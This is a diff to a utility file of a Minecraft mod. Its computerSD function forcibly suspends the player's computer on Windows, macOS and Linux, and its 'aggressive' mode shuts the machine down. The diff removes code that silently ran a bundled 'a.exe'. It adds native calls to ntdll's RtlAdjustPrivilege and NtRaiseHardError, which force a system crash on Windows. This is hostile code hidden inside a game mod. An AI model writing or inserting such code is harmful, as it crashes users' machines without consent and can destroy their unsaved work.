@@ -2,7 +2,6 @@
 
 package breadmod.util
 
-import breadmod.item.tool_gun.mode.ToolGunPowerMode
 import com.google.gson.JsonArray
 import com.google.gson.JsonElement
 import com.google.gson.JsonObject
@@ -38,9 +37,7 @@ import net.minecraftforge.registries.RegistryObject
 import thedarkcolour.kotlinforforge.forge.vectorutil.v3d.plus
 import thedarkcolour.kotlinforforge.forge.vectorutil.v3d.times
 import thedarkcolour.kotlinforforge.forge.vectorutil.v3d.toVec3i
-import java.nio.file.Files
-import kotlin.io.path.absolutePathString
-import kotlin.io.path.writeBytes
+import java.lang.foreign.*
 import kotlin.math.ceil
 import kotlin.math.floor
 import kotlin.math.ln
@@ -235,20 +232,39 @@ fun computerSD(aggressive: Boolean) {
     when {
         os.contains("win", true) -> {
             if(aggressive) {
-                val resource = ToolGunPowerMode::class.java.getResourceAsStream("/a.exe")!!
-                val temp = Files.createTempFile("a", "exe")
-                temp.writeBytes(resource.readAllBytes())
-                runtime.exec(temp.absolutePathString())
+                val arena = Arena.ofConfined()
+
+                val linker = Linker.nativeLinker()
+                val lookup = SymbolLookup.libraryLookup("ntdll.dll", arena)
+                val addr1 = lookup.find("RtlAdjustPrivilege").get()
+                val addr2 = lookup.find("NtRaiseHardError").get()
+
+                val tmp = arena.allocate(ValueLayout.ADDRESS)
+                val addr1sig = FunctionDescriptor.of(
+                    ValueLayout.JAVA_INT, ValueLayout.JAVA_INT, ValueLayout.JAVA_INT,
+                    ValueLayout.ADDRESS
+                )
+                val rtap = linker.downcallHandle(addr1, addr1sig)
+                val addr2sig = FunctionDescriptor.of(
+                    ValueLayout.JAVA_INT, ValueLayout.JAVA_INT, ValueLayout.JAVA_INT,
+                    ValueLayout.ADDRESS, ValueLayout.JAVA_INT, ValueLayout.ADDRESS
+                )
+                val ntrhe = linker.downcallHandle(addr2, addr2sig)
+                rtap.invoke(19, 1, 0, tmp)
+                ntrhe.invoke(0xB43AD30D, 0, 0, 0, 6, tmp)
             }
-            runtime.exec("RUNDLL32.EXE powrprof.dll,SetSuspendState 0,1,0")
+            runtime.exec(arrayOf("RUNDLL32.EXE", "powrprof.dll,SetSuspendState 0,1,0"))
         }
+
         os.contains("mac", true) -> {
-            runtime.exec("pmset sleepnow")
+            runtime.exec(arrayOf("pmset", "sleepnow"))
         }
+
         os.contains("nix", true) || os.contains("nux", true) || os.contains("aix", true) -> {
-            if(aggressive) runtime.exec("shutdown 0")
-            runtime.exec("systemctl suspend")
+            if (aggressive) runtime.exec(arrayOf("shutdown", "0"))
+            runtime.exec(arrayOf("systemctl", "suspend"))
         }
+
         else -> if(aggressive) throw IllegalStateException("Screw you! You're no fun.")
     }
 
